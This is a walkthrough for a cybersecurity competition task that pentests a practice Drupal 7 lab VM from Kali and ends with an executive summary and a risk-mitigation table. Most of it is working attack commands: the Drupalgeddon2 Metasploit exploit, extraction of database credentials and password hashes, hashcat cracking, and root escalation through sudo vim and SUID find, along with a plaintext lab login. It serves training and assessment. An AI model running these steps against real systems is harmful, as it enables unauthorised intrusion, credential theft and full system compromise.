# 10 — Day 1 (MA1) — CMS Pentest Walkthrough

**Target time:** ~3 hours of focused work + 1–2 hours of documentation = full Day 1.
**Login (workstation):** `competitor1a / Boracay@14!`
**VMs:** CMS target `192.168.2.1` + Kali `192.168.2.2 (kali/kali)`
**Deliverable:** ONE document on the desktop, named with your country code, containing answers to **4 task tables** with screenshots + executive summary + top-3 risks.

> Source of truth: `testpacakge_pdf/WSA2025_TP54_MA1_actual_en_final (1).pdf`. Re-read it on competition day before starting — wording or specific questions may shift.

---

## What MA1 actually asks (4 tasks)

| Task | What | Answers required |
|---|---|---|
| **1. Information Gathering** | Scan the target, identify services, find a hidden secret message in one of the services | Q1 services list (+ screenshot), Q2 secret message (+ screenshot) |
| **2. CMS Vulnerability Assessment** | Identify CMS version + pentest the CMS to uncover sensitive info | Q1 version (+ screenshot), Q2 sensitive info via pentest (+ screenshot) |
| **3. System Security Weaknesses** | Find the weak user account, crack pwd, find sensitive info in their home, escalate to root | Q1 username (+ screenshot), Q2 password (+ screenshot), Q3 home-dir secret (+ screenshot), Q4 root info (+ screenshot) |
| **4. Analysis & Report** | Executive summary (≤150 words) + top-3 security risks table | Filled-in template |

---

## Phase 0 — Setup (5 min)

On Kali (`kali/kali`):
```bash
# Set the target as a variable
export TGT=192.168.2.1
mkdir -p ~/ma1 && cd ~/ma1
```

Open a screenshot tool (Greenshot, or Kali's built-in `Screenshots` app). **Capture a screenshot of every command's output** — you need them for the report.

---

## Task 1 — Information Gathering

### Q1 — Identify services running on the target

```bash
# Quick top-1000 ports
nmap -sC -sV -T4 -oN nmap_quick.txt $TGT
```

**Expected output for our practice target:**
```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.x (Ubuntu)
80/tcp   open  http     Apache httpd 2.4.x
| http-server-header: Apache/2.4.x (Ubuntu)
| http-generator: Drupal 7
```

**Answer for Q1:** "The target runs **2 services**: SSH on port 22 (OpenSSH) and HTTP on port 80 (Apache hosting Drupal 7 CMS)."

📸 **Screenshot the nmap output.**

For thoroughness (full port range — slower):
```bash
nmap -p- --min-rate 5000 -oN nmap_full.txt $TGT
```

### Q2 — Connect to a service, find a hidden secret message

This is the "low-hanging fruit" task. Try each service for hidden info:

#### 2.1 — Check SSH banner
```bash
nc -nv $TGT 22
# (Press Ctrl+C after 5 sec)
```
Read the banner — sometimes the secret message is there. If not, move on.

#### 2.2 — Check HTTP for hidden files / banner
```bash
# Header dump
curl -I http://$TGT/

# Check robots.txt
curl http://$TGT/robots.txt

# Check standard hidden paths
curl http://$TGT/.htaccess
curl http://$TGT/CHANGELOG.txt
curl http://$TGT/README.txt

# Look at HTML source for HTML comments
curl -s http://$TGT/ | grep -i "secret\|flag\|message\|todo\|hidden"
```

For Drupal specifically, `CHANGELOG.txt` and `README.txt` are often readable and contain the version.

**Most likely place for the "secret message":** view the HTML source of the home page — there's typically an HTML comment like `<!-- secret: flag{...} -->` planted by the chief.

```bash
curl -s http://$TGT/ -o home.html
less home.html
# search for: <!-- 
```

If nothing in HTTP, try directory enumeration:
```bash
gobuster dir -u http://$TGT -w /usr/share/wordlists/dirb/common.txt -x txt,html,php -o gobuster.txt
```

📸 **Screenshot whichever method finds the secret.**

**Answer for Q2:** Once found, paste the message text in the answer cell. Example: *"Secret message found in HTML comment of /index.php: 'flag{discovered_in_html_source}'"*

---

## Task 2 — CMS Vulnerability Assessment

### Q1 — Identify the CMS version

#### 2.1 — Use whatweb
```bash
whatweb http://$TGT
```
Output will show: `Drupal[7.57]` or similar — that's the version.

#### 2.2 — Confirm via CHANGELOG
```bash
curl -s http://$TGT/CHANGELOG.txt | head -5
```
First line usually says: `Drupal 7.57, 2018-02-21`.

#### 2.3 — Drupal-specific scanner
```bash
droopescan scan drupal -u http://$TGT
```
Reports version, enabled modules, and known users.

**Answer Q1:** *"The target runs **Drupal 7.57**, confirmed via whatweb and the CHANGELOG.txt file."*

📸 **Screenshot whatweb output + CHANGELOG.txt header.**

### Q2 — Pentest the CMS, uncover sensitive info

#### 2.4 — Search for known exploits
```bash
searchsploit drupal 7
```
Look for **"Drupal 7.x Module Services - Remote Code Execution"** and **"Drupal 7.0 < 7.31 - SQL Injection"** and **"Drupal < 7.58 - 'Drupalgeddon2' RCE"** (CVE-2018-7600).

#### 2.5 — Exploit Drupalgeddon 2 via Metasploit
```bash
msfconsole -q
```
Inside msfconsole:
```
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.2.1
set LHOST 192.168.2.2
set TARGETURI /
run
```
You should land in a Meterpreter shell as **`www-data`**.

```
meterpreter > getuid
Server username: www-data
```

#### 2.6 — Extract sensitive information
Once you have the shell:
```bash
# Drop to a regular shell
shell

# Drupal stores DB creds in settings.php
cat /var/www/html/sites/default/settings.php | grep -A3 "databases"
# You'll see something like:
#   'database' => 'drupal',
#   'username' => 'drupal',
#   'password' => 'drupalpass',
```

```bash
# Dump Drupal users from the DB
mysql -u drupal -pdrupalpass drupal -e "SELECT uid,name,mail,pass FROM users;"
# Capture: admin and john user records, including their hashed passwords
```

📸 **Screenshot the settings.php DB credentials AND the users table dump.**

**Answer Q2:** *"Sensitive information uncovered via Drupalgeddon 2 (CVE-2018-7600) exploitation:*
- *Database credentials in `/var/www/html/sites/default/settings.php` (drupal/drupalpass)*
- *Drupal users table contains hashed passwords for admin and john accounts."*

---

## Task 3 — System Security Weaknesses

> 🧠 **Pre-flight — set the username variable on Kali before running Task 3.**
>
> At this point you know the **username** (you discovered it in the Drupal users table dump from Task 2 Q2 — could be `john`, `mark`, `alice`, etc.). You do NOT know the password yet — that's what hashcat will crack in Q2 below.
>
> ```bash
> # On Kali — set the username:
> export VICTIM=john              # ← change to YOUR weak user's name
> ```
>
> The **password variable `$VPASS` gets set AFTER hashcat cracks it** (see Q2 step 2.2 below). Until then, you don't know it.
>
> Throughout Task 3 you'll see `$VICTIM` (username — set now) and `$VPASS` (password — set after Q2). If you switch terminal sessions, re-run the `export` lines.

### Q1 — Identify the user account that exposes the system weakness

From the Drupal users table (Task 2 Q2 dump), one user has a deliberately weak password. The dump looks like:

```
uid | name      | mail                    | pass
----+-----------+-------------------------+---------------------
1   | admin     | admin@manila.local      | $S$D... (long hash)
2   | <VICTIM>  | <VICTIM>@manila.local   | $S$D... (long hash)
```

**The weakness candidate is the regular user (uid 2 or higher), NOT `admin`** — admin accounts are typically protected by stricter procedures; a regular user with a weak password is the typical "exposes a weakness" pattern.

If you're unsure which user is weakest, look at the Drupal admin panel:
1. Browse to `http://192.168.2.1/?q=admin/people` (logged in as admin)
2. List shows all users. The non-admin user with a "Marketing" or generic role + non-strong password is your target.

📸 **Screenshot the Drupal `/admin/people` page showing the user list, OR the users table dump highlighting your target user.**

**Answer Q1:** *"User account `<VICTIM>` (uid=N) — exposes the system weakness via a weak password that violates security policies."*

> **Replace `<VICTIM>` with the actual username** in your report. E.g. if you created `mark`, write: *"User account `mark` (uid=2) — exposes the system weakness..."*

### Q2 — Crack john's password

> 🚨 **CRITICAL — switch back to Kali BEFORE running hashcat.** During Task 2 you ran `msfconsole → Drupalgeddon2 → shell`, which dropped you into a shell **on the Drupal target VM**. The target does NOT have hashcat installed — only Kali does. If you try `hashcat` from inside the meterpreter shell, you'll see:
> ```
> /bin/sh: 2: hashcat: not found
> ```
>
> **Fix — exit back to Kali first:**
> ```
> exit            ← exits the shell, back to meterpreter
> exit            ← exits meterpreter, back to msf6 prompt
> exit            ← exits msfconsole, back to Kali bash
> ```
> Verify you're on Kali:
> ```bash
> whoami; hostname
> # Must print: kali / kali
> ```
> If the output is anything else (e.g. `www-data`, `root` on a non-Kali host), keep typing `exit` until you see `kali@kali:~$`.

> 🧠 **MEMORIZE this rule:** **hashcat always runs on Kali, never on the target.** The target is what you attack; Kali is where you crack hashes.

#### 2.1 — Get the hash from the DB dump (Drupal 7 hash format starts with `$S$`)

From the Task 2 DB dump, copy your target user's full `$S$D...` hash (the long string in the `pass` column for `$VICTIM`'s row). Then on **Kali** (not the target):
```bash
# Save the hash to a file — use echo -n to avoid trailing newline
# Replace the placeholder with the ACTUAL hash you copied
echo -n '$S$D...paste_full_hash_for_$VICTIM...' > /tmp/$VICTIM.hash

# Verify the file is clean (no trailing newline, no extra characters)
cat /tmp/$VICTIM.hash; echo "[end]"
# Should print: $S$D...whatever[end]  ← [end] right after, no blank line
```

> ⚠️ **Watch for these common pitfalls:**
> - Don't include the username prefix (`$VICTIM:` or `admin:`) — mode 7900 wants ONLY the hash
> - Don't include trailing whitespace or `\n` — use `echo -n` not plain `echo`
> - Don't truncate — the full hash is ~55 characters starting with `$S$D`
> - The hash file path uses `$VICTIM` so it auto-names per your user (e.g. `/tmp/mark.hash` if `VICTIM=mark`)

#### 2.2 — Crack with hashcat
Drupal 7 hash mode = `7900` in hashcat:
```bash
hashcat -m 7900 /tmp/$VICTIM.hash /usr/share/wordlists/rockyou.txt
```

> 🧠 **WATCH FOR TYPOS in the path.** The folder is **`wordlists`** (w-o-r-d-l-i-s-t-s), not `wordlsits`. A typo here causes `No such file or directory`.

If `rockyou.txt` is missing (only `.gz` exists), extract it first:
```bash
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
ls -la /usr/share/wordlists/rockyou.txt
# Expect: ~134 MB plain text file
```

Wait ~5–30 sec. Hashcat will print:
```
$S$D...:<your_cracked_password>

Status...........: Cracked
```

The plain-text password (after the `:` colon) is what hashcat just recovered from the hash. **NOW set the VPASS variable** with this cracked value — you'll use it for SSH in Q3:

```bash
# Replace <paste_here> with the actual plain-text password hashcat just printed
export VPASS=<paste_cracked_password_here>

# Verify
echo "Username: $VICTIM"
echo "Cracked password: $VPASS"
```

Example: if hashcat showed `$S$D...:letmein123`, then run `export VPASS=letmein123`.

Show the cracked result anytime later:
```bash
hashcat -m 7900 /tmp/$VICTIM.hash --show
# Output: $S$D...:<cracked_password>
```

Or with John the Ripper as a fallback:
```bash
john --format=drupal7 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/$VICTIM.hash
john --show --format=drupal7 /tmp/$VICTIM.hash
```

📸 **Screenshot hashcat showing the cracked password.**

**Answer Q2:** *"`$VICTIM`'s password is `$VPASS` (substitute actual values — e.g. `mark`'s password is `letmein123`), cracked using hashcat mode 7900 (Drupal 7) against rockyou.txt wordlist in under 1 minute."*

> **In your report, write the actual username + password.** Example: *"User `mark`'s password is `letmein123`, cracked using hashcat mode 7900..."*

#### Common errors at this step

| Error | Cause | Fix |
|---|---|---|
| `/bin/sh: hashcat: not found` | You're inside meterpreter shell on the target, not on Kali | Type `exit` until `whoami` returns `kali` |
| `No such file or directory: /usr/share/wordlsits/rockyou.txt` | Typo — `wordlsits` instead of `wordlists` | Re-type carefully: `wordlists` |
| `No hashes loaded` | Hash file empty or has username prefix | `cat /tmp/john.hash` to inspect; re-save without the `username:` prefix |
| `Token length exception` | Hash truncated or mangled | Re-copy full `$S$D...` (about 55 chars) |
| Hashcat opens then immediately exits with no result | Already cracked previously — check with `hashcat -m 7900 /tmp/john.hash --show` | Re-run with `--show` to see cached crack |
| `Cannot allocate memory` / OpenCL errors | VM has no GPU; hashcat tries OpenCL | Add `-D 1 --force --workload-profile 1` to use CPU only |

### Q3 — Sensitive info in `$VICTIM`'s home directory

Use the cracked password to SSH in:
```bash
ssh $VICTIM@192.168.2.1
# password: $VPASS  (will be silent — type it carefully)
```

> ⚠️ **If SSH says "Permission denied":** the Drupal CMS password and the Linux OS password might be different. Two fallbacks:
> 1. **Use privesc first** (Q4 below) — read `/home/$VICTIM/secret.txt` as root after you escalate. Skips SSH entirely.
> 2. **Reset the OS password to match:** after privesc to root: `echo "$VICTIM:$VPASS" | chpasswd` then retry SSH.

Then explore:
```bash
cd ~
ls -la
cat secret.txt
```

Expected output (the exact flag value depends on your setup — usually `flag{...}` format):
```
Hidden flag in $VICTIM's home: flag{<contents_set_during_setup>}
```

If your setup script (per `03_Setup_VMs_MA1.md` Step 2.5) used `flag{john_was_here_2025}` literally, the file content reflects that. If you customized it, the content is whatever you put in.

Also check:
```bash
cat .bash_history          # commands $VICTIM ran
ls -la ~/.ssh/             # any SSH keys?
find / -user $VICTIM 2>/dev/null   # all files owned by $VICTIM
```

📸 **Screenshot of `cat secret.txt` showing the actual flag value.**

**Answer Q3:** *"In `$VICTIM`'s home directory `/home/$VICTIM/secret.txt` — content: `<actual_flag_text>`. File permissions 600 (owner-readable only)."*

> **In your report, replace placeholders with actuals.** Example: *"In mark's home directory `/home/mark/secret.txt` — content: `flag{compromised_user_2025}`. File permissions 600..."*

### Q4 — Gain root access + sensitive info from /root/

#### 4.1 — Check privesc paths
Still as john on the SSH session:
```bash
sudo -l
# May print: (ALL) NOPASSWD: /usr/bin/vim

find / -perm -4000 -type f 2>/dev/null
# Look for non-standard SUID — find, vim, awk, python all suspicious
```

#### 4.2 — Privesc via sudo NOPASSWD vim (most common)
```bash
sudo /usr/bin/vim -c ':!/bin/bash'
# You're now root.
whoami
# root
```

#### 4.2-alt — Privesc via SUID find
```bash
find . -exec /bin/sh -p \; -quit
# Spawns root shell because find is SUID.
whoami
# root
```

#### 4.3 — Read the root flag
```bash
cd /root
ls -la
cat proof.txt
# Output: Root flag: flag{root_compromise_complete_2025}
```

Also:
```bash
cat /etc/shadow | head -5     # all password hashes — proof of root
```

📸 **Screenshot the privesc command + `whoami` + `cat /root/proof.txt`.**

**Answer Q4:** *"Root access obtained via `sudo /usr/bin/vim -c ':!/bin/bash'` (john had NOPASSWD sudo on vim). Root directory `/root/proof.txt` contains: `flag{root_compromise_complete_2025}`. Also extracted `/etc/shadow` confirming full root privileges."*

---

## Task 4 — Analysis and Report

### Executive Summary (≤150 words)

Use this skeleton — adjust to your findings (the 150-word limit is strict):

```
Executive Summary

A vulnerability assessment and basic penetration test were performed
against a Linux server running Drupal 7.57 CMS. The assessment uncovered
multiple critical security weaknesses that allowed full system
compromise from initial reconnaissance to root access.

Three top risks were identified: (1) the CMS runs an unpatched version
vulnerable to Drupalgeddon 2 (CVE-2018-7600), allowing unauthenticated
remote code execution; (2) a regular user account (john) uses a
weak dictionary-based password that cracks in under a minute against
common wordlists; (3) the same user has unrestricted sudo access to
the vim editor, providing a trivial path to root privilege escalation.

Combined, these issues escalate from anonymous Internet exposure to
full root compromise within ~10 minutes. Immediate remediation is
required before this server should be considered safe for production.
```

Word count: ~145. Tweak to fit your actual findings.

### Table 1 — Security Risk and Mitigation Recommendation (top 3 only)

| Description | Severity (0–10) | Risk | Why is this a problem? | Mitigation Recommendation |
|---|---|---|---|---|
| **Drupal 7.57 vulnerable to Drupalgeddon 2 (CVE-2018-7600)** — unauthenticated RCE | **10** | **Critical** | Anyone on the network with no credentials can execute arbitrary code as the web user. Exploitation is fully automated via Metasploit. Leads to full server compromise. | Patch to Drupal ≥ 7.58 immediately. If patching impossible, apply the official mitigation patch. Move site behind WAF (ModSecurity + OWASP CRS) as compensating control. |
| **Weak user password (`john / password123`)** — present in common wordlists | **8** | **High** | A standard dictionary attack cracks the hash in under a minute. Once the credential is recovered, the attacker has SSH access to the system. | Enforce a domain password policy: minimum 12 characters, complexity (upper/lower/digit/symbol), 90-day rotation, deny-list of common passwords. Force john to reset. Implement account lockout after 5 failed SSH logins. |
| **Excessive sudo privileges (`john ALL=(ALL) NOPASSWD: /usr/bin/vim`)** — trivial privilege escalation | **9** | **Critical** | vim has a built-in shell escape (`:!sh`) that runs as the sudo target user (root). Any compromised john session = full root. | Remove the sudoers entry. Apply principle of least privilege: only specific scripts via sudo, never an editor. Audit all `/etc/sudoers.d/*` files. Consider sudo logging and `sudo --restricted` flags. |

### Save the deliverable

```
File name suggestion: PHL_Team1_MA1_Report.pdf
Save to: C:\Users\competitor1a\Desktop\
```

Per MA1 PDF: combine all answer documents into a single file labelled with country code on competitor's desktop. Print to PDF.

---

## Time check

| Phase | Target | Real |
|---|---|---|
| Setup + Task 1 (Info Gathering) | 0:30 | __ |
| Task 2 (CMS Vuln Assessment) | 0:30 | __ |
| Task 3 (Sys Weaknesses + Privesc) | 0:45 | __ |
| Task 4 (Report writing) | 1:00 | __ |
| Buffer / proofread | 0:15 | __ |
| **Total** | **3:00** | __ |

---

## What if the actual CMS isn't Drupal?

The chief may pick a different CMS (Joomla, WordPress, MediaWiki, etc.). The **methodology stays identical**:

| Step | What changes |
|---|---|
| Task 1 | nmap output identifies the CMS via banner / cookies / generator meta tag |
| Task 2 Q1 | Use whatweb / wpscan / joomscan / cmsmap depending on the CMS |
| Task 2 Q2 | `searchsploit <cms> <version>` to find the right exploit; replace `drupal_drupalgeddon2` with whatever Metasploit module fits |
| Task 3 | Same workflow: dump users → crack hash → SSH → privesc |
| Task 4 | Same report template, just swap the CVE numbers and CMS name |

Practice on Drupal 7 makes you fluent in the workflow. The actual CMS gets identified in Task 1 and the rest plugs in.

---

## Marks coverage (best estimate)

The marking scheme has 4 aspects in row A1 (D31 / D32 / D37 / D42) — Lyon-leftover row names. Based on Day 1 PDF tasks the K-values likely map as:

| Lyon row | What it likely scores in the actual MA1 |
|---|---|
| D31 (Meas, K=2.0) | Task 1 + Task 2 Q1 (services + version identified) |
| D32 (Judg, K=2.0 / max 3) | Executive summary quality |
| D37 (Judg, K=1.0 / max 3) | Top-3 risk table — risk #1 quality |
| D42 (Judg, K=1.0 / max 3) | Top-3 risk table — risks #2 and #3 quality |
| (likely additional rows) | Task 3 user/password/home/root + screenshots |

Total Crit A1 K-target: **6.0+** (may be more once chief releases the actual MA1-aligned marking scheme).

Next file: **`20_Day1_MA2_Firewall.md`** for Day 2 (MA2 hardening) work.
